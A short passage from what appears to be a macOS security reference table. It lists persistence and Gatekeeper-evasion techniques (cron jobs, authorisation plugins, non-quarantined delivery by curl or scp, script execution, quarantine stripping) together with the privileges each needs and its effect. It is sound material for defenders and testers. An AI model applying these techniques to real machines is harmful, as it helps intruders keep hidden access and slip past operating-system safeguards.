| cron persistence | User, possibly a TCC grant | Quiet persistence outside BTM, but anomalous on a Mac |
| Authorisation plugin persistence | root | root code execution at every console login, outside BTM, rarely inspected |
| Non-quarantined delivery (`curl`, `scp`, mount, compile on host) | Any execution primitive | Code execution with no Gatekeeper assessment at all |
| Script-based execution | `zsh`, `bash`, `perl` or `ruby`, all of which ship | Execution that is never Gatekeeper-assessed even when quarantined. Not Python: it does not ship |
| Quarantine stripping | Write access to the file | Restores execution, but `com.apple.macl` and `com.apple.provenance` remain and cannot be removed |
